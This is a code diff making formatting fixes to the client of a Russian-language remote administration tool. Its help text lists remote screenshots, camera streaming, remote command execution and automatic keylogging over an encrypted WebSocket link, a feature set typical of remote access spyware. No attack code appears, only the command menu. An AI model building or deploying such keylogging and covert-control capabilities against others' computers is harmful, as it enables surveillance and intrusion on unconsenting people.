@@ -17,7 +17,7 @@ client.py — клиентская часть удалённого админи�
     keylog auto         — автоматический мониторинг клавиатуры
     ping                — проверить соединение
     help                — список команд
-    exit                — отключиться и выйти
+    exit                — отключиться и ВЫЙТИ
 
 Протокол: WebSocket + шифрование Fernet.
 """
@@ -741,8 +741,7 @@ class RemoteClient:
 
         print("\n" + "=" * 60)
         print("  Remote Admin Client — управляющий ПК")
-        print("=" * 60)
-         print("""  Команды:
+        print("""  Команды:
     screenshot          — получить скриншот
     stream              — запустить/остановить камеру
     exec <command>      — выполнить команду
@@ -955,8 +954,8 @@ class RemoteClient:
         log.info("Клиент остановлен")
 
     @staticmethod
-     def _print_help():
-         print("""
+    def _print_help():
+        print("""
 Доступные команды:
   screenshot [quality]       Получить скриншот (quality: 1-100, по умолч. 80)
   stream [fps]               Запустить/остановить видеопоток с камеры
